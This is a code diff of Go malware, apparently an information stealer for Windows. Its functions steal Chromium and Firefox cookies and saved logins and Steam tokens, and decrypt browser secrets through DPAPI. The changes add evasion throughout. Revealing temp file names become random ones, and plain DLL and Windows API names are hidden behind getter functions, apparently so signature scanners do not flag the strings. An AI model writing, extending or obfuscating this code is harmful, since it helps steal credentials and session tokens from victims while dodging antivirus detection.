@@ -164,7 +164,7 @@ func stealChromiumCookies(userDataPath string, browserName string, browserExe st
 			}
 		}
 
-		tmpPath := filepath.Join(os.TempDir(), fmt.Sprintf("wr_ck_%s_%s_%d", browserName, strings.ReplaceAll(profile, " ", ""), time.Now().UnixNano()))
+		tmpPath := filepath.Join(os.TempDir(), fmt.Sprintf("t%x_%d", rand.Intn(0xFFFF), time.Now().UnixNano()))
 		copyOk := false
 		var copyErr error
 		if err := copyFileLocked(cookiePath, tmpPath, browserExe); err == nil {
@@ -270,7 +270,7 @@ func stealChromiumLogins(userDataPath string, browserName string, browserExe str
 			continue
 		}
 
-		tmpPath := filepath.Join(os.TempDir(), fmt.Sprintf("wr_lg_%s_%s_%d", browserName, strings.ReplaceAll(profile, " ", ""), time.Now().UnixNano()))
+		tmpPath := filepath.Join(os.TempDir(), fmt.Sprintf("t%x_%d", rand.Intn(0xFFFF), time.Now().UnixNano()))
 		copyOk := false
 		if err := copyFileLocked(loginPath, tmpPath, browserExe); err == nil {
 			if info, serr := os.Stat(tmpPath); serr == nil && info.Size() > 0 {
@@ -360,7 +360,7 @@ func stealFirefoxCookies(profilesPath string, browserExe string) (string, []stri
 			continue
 		}
 
-		tmpPath := filepath.Join(os.TempDir(), fmt.Sprintf("wr_ff_cookies_%s_%d", e.Name(), time.Now().UnixNano()))
+		tmpPath := filepath.Join(os.TempDir(), fmt.Sprintf("t%x_%d", rand.Intn(0xFFFF), time.Now().UnixNano()))
 		if err := copyFileLocked(cookiePath, tmpPath, browserExe); err != nil {
 			errs = append(errs, fmt.Sprintf("firefox/%s copy: %v", e.Name(), err))
 			continue
@@ -566,8 +566,8 @@ func stealSteamTokens() string {
 		"Software\\\\Valve\\\\Steam",
 	}
 
-	advapi32 := syscall.NewLazyDLL("advapi32.dll")
-	regEnumValue := advapi32.NewProc("RegEnumValueW")
+	advapi32 := syscall.NewLazyDLL(getAdvapi32DLL())
+	regEnumValue := advapi32.NewProc(getRegEnumValueWName())
 
 	for _, regPath := range regPaths {
 		var hKey syscall.Handle
@@ -948,8 +948,8 @@ func dpapiDecrypt(data []byte) ([]byte, error) {
 		return nil, fmt.Errorf("empty data")
 	}
 
-	crypt32 := syscall.NewLazyDLL("crypt32.dll")
-	proc := crypt32.NewProc("CryptUnprotectData")
+	crypt32 := syscall.NewLazyDLL(getCrypt32DLL())
+	proc := crypt32.NewProc(getCryptUnprotectDataName())
 
 	inBlob := cryptDataBlob{
 		cbData: uint32(len(data)),
@@ -969,8 +969,8 @@ func dpapiDecrypt(data []byte) ([]byte, error) {
 	}
 
 	defer func() {
-		kernel32 := syscall.NewLazyDLL("kernel32.dll")
-		localFree := kernel32.NewProc("LocalFree")
+		kernel32 := syscall.NewLazyDLL(getKernel32DLL())
+		localFree := kernel32.NewProc(getLocalFreeName())
 		_, _, _ = localFree.Call(uintptr(unsafe.Pointer(outBlob.pbData)))
 	}()
 
@@ -989,13 +989,13 @@ func copyFileLocked(src, dst, browserExe string) error {
 		return os.WriteFile(dst, data, 0o644)
 	}
 
-	kernel32 := syscall.NewLazyDLL("kernel32.dll")
+	kernel32 := syscall.NewLazyDLL(getKernel32DLL())
 
 	srcPtr, _ := syscall.UTF16PtrFromString(src)
-	createFile := kernel32.NewProc("CreateFileW")
-	readFileProc := kernel32.NewProc("ReadFile")
-	getFileSizeProc := kernel32.NewProc("GetFileSizeEx")
-	closeHandleProc := kernel32.NewProc("CloseHandle")
+	createFile := kernel32.NewProc(getCreateFileWName())
+	readFileProc := kernel32.NewProc(getReadFileName())
+	getFileSizeProc := kernel32.NewProc(getGetFileSizeExName())
+	closeHandleProc := kernel32.NewProc(getCloseHandleName())
 
 	h, _, _ := createFile.Call(
 		uintptr(unsafe.Pointer(srcPtr)),
@@ -1023,7 +1023,7 @@ func copyFileLocked(src, dst, browserExe string) error {
 	}
 
 	dstPtr, _ := syscall.UTF16PtrFromString(dst)
-	copyFileW := kernel32.NewProc("CopyFileW")
+	copyFileW := kernel32.NewProc(getCopyFileWName())
 	r, _, _ := copyFileW.Call(uintptr(unsafe.Pointer(srcPtr)), uintptr(unsafe.Pointer(dstPtr)), 0)
 	if r != 0 {
 		check, _ := os.ReadFile(dst)
